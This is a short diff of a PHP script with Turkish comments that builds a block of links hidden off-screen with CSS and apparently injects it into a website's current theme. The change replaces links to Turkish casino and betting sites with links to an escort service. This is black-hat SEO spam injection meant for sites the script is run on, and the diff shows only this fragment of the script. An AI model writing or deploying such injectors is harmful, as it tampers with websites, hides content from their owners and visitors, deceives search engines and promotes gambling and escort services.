@@ -20,18 +20,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     try {
         // Eklenecek backlink kodu
         $backlinkCode = '<span style="position: absolute; left: -9655px;">
-<a href="https://www.cristine.org/" title="bonus veren bet siteleri">bonus veren bet siteleri</a>
-<a href="https://actingupstage.com/" title="deneme bonusu veren siteler">deneme bonusu veren siteler</a>
-<a href="https://honestk.com/" title="casino siteleri">casino siteleri</a>
-<a href="https://bonuspick.net/" title="https://bonuspick.net">https://bonuspick.net</a>
-<a href="https://lexilight.com/" title="kumar siteleri">deneme kumar siteleri</a>
-<a href="https://secretosdepros.com/" title="casino siteleri 2025">casino siteleri 2025</a>
-
-<a href="https://myremedyproducts.com" title="myremedyproducts.com">myremedyproducts.com</a>
-
-<a href="https://cryptonumerics.com" title="cryptonumerics.com">cryptonumerics.com</a>
-
-<a href="https://stolenbeauty.org" title="stolenbeauty.org">stolenbeauty.org</a>
+<a href="https://www.voguerre.com" title="voguerre">voguerre</a>
+<a href="https://www.voguerre.com/sunderland-escort" title="sunderland escorts">sunderland escorts</a>
 </span>';
 
         // Mevcut temayı al
